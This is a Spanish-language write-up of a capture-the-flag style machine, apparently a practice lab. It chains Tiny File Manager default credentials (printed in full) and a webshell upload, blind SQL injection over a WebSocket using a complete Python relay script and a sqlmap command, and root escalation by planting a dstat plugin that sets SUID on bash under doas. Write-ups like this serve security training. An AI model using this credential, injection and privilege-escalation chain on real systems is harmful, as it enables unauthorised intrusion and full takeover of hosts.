## Tecnicas utilizadas
- Default Credentials for Tiny FIle Manager
- RCE(Tiny File Manager)
- SQLi Blind WebSocket
## Procedimiento
- Atraves de un escaneo de directorios con gobuster damos con la ruta */tiny*. Esta es un login, pruebo con las combinaciones basicas como admin:admin, guest:guest, root:root, nada funciona. Googleando un poco, hay un articulo que nos brinda las credenciales por default que vienen con tiny file manager; **Admin:Admin@123**
- Vemos varios archivos, alguno de ellos son imagenes y encontramos una carpeta llamada *tiny*. Eso nos hace pensar que quizás sea la ruta real en la maquina. Dentro de tiny no podemos subir ninguna web shell ya que no tenemos permisos, pero dentro tambien hay una carpeta llamada Uploads, y aqui si podemos proceder a subir nuestra webshell.
- Una vez conseguido el acceso a la maquina, me doy cuenta a traves de */etc/nginx/sites-avalibles* que hay VH, asi que procedo a añadir la nueva ruta encontrada en el */etc/hosts*
- Visitando la pagina, vemos que es la misma pagina principal, a diferencia, que esta añade mas secciones. En la sección de tickets, nos percatamos que podemos verificar si hay tickets que existen, esto funciona por detras, con un WebSocket, que es como una api.
- Googleando otro poco, encontramos un articulo que explica como podemos inyectar comandos al web sockets. Necesitamos el siguiente exploit y SQLMap
```python

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

- Con sqlmap, nos conectamos de forma local ``sqlmap -u "http://localhost:8081/?id=1" --batch --dbs`` y empezamos a emnumerar. Damos con un usuario y una contraseña que nos sirve para conectarnos por SSH a la maquina victima.
- Buscamos por archivos con permiso SUID. Encontramos **doas**, ahora solo queda encontrar el archivo de configuración para ver que tenemos permitido ejecutar como root.
- Enconttamos el binario **Dstat**, y tenemos permiso de escritura para la carpeta que gestiona los plugins. Creamos un archivo que otorge SUID a la bash y ejecutamos Dstat con doas como Root ``doas -root dstat --<plugin-name>``